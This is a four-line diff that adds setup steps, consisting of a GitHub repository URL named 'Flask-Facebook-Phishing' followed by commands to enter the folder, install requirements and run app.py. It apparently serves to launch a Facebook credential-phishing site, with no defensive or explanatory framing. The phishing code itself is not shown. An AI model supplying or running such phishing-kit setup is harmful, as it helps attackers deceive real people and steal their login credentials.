@@ -1,0 +1,4 @@
+https://github.com/Ch4rlzki/Flask-Facebook-Phishing.git
+cd Flask-Facebook-Phishing
+pip install -r requirements.txt
+py app.py
